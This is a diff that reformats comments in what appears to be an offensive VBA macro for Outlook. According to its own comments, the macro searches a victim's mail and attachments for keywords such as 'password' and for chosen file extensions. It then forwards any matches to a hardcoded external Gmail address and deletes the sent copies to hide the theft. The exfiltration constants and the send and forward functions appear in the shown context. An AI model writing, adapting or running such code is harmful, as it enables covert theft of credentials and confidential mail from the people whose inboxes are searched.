@@ -1,25 +1,25 @@
-'This VBA parses Outlook, searches for sensitive keywords _
-and file extensions, exfils the data via email, and then _
-deletes the sent emails.
+'This VBA parses Outlook, searches for sensitive keywords 
+'and file extensions, exfils the data via email, and then 
+'deletes the sent emails.
 
-'Author: John Woodman _
-Twitter: @JohnWoodman15
+'Author: John Woodman
+'Twitter: @JohnWoodman15
 
-'Variable exfil_address is the email address that _
-the parsed emails are sent to.
+'Variable exfil_address is the email address that 
+'the parsed emails are sent to.
 Const exfil_address As String = "john.woodman11@gmail.com"
 
-'The variable daysToSearch determines how many days _
-worth of emails to look through. It's currently set _
-to parse the last 30 days of emails.
+'The variable daysToSearch determines how many days 
+'worth of emails to look through. It's currently set 
+'to parse the last 30 days of emails.
 Const daysToSearch As Integer = 30
     
 Sub parse_outlook()
-    'This function loops through Outlook inbox and calls _
-    functions to parse inbox for keywords and extensions.
+    'This function loops through Outlook inbox and calls 
+    'functions to parse inbox for keywords and extensions.
     
-    'These are the keywords and file extensions that _
-    are searched for in the emails and attachments.
+    'These are the keywords and file extensions that 
+    'are searched for in the emails and attachments.
     Dim keywords
     keywords = Array( _
         "password", _
@@ -104,8 +104,8 @@ Sub parse_outlook()
 End Sub
 
 Sub send_mail(body As String, subject As String)
-    'This function sends the body of the email containing _
-    the keyword to the specified email address.
+    'This function sends the body of the email containing 
+    'the keyword to the specified email address.
     
     Dim xOutApp As Object
     Dim xOutMail As Object
@@ -132,8 +132,8 @@ Sub send_mail(body As String, subject As String)
 End Sub
 
 Sub send_attach(OlMail As Variant, subject As String)
-    'This function forwards the email containing _
-    the attachment to the specified email address.
+    'This function forwards the email containing 
+    'the attachment to the specified email address.
     
     Dim xOutMail As Object
     Set xOutMail = OlMail.Forward
@@ -154,8 +154,8 @@ End Sub
 
 
 Public Function parse_body(body As String, subject As String, keywords As Variant) As Boolean
-    'This function parses the body and subject _
-    of the email, searching for the provided keywords.
+    'This function parses the body and subject 
+    'of the email, searching for the provided keywords.
     
     parse_body = False
     
@@ -172,9 +172,9 @@ End Function
 
 
 Public Function parse_attachment(attachment As Variant, extensions As Variant, keywords As Variant) As Boolean
-    'This function parses the attachments of the _
-    email and searches for the provided keywords _
-    and extensions.
+    'This function parses the attachments of the 
+    'email and searches for the provided keywords 
+    'and extensions.
     
     parse_attachment = False
     
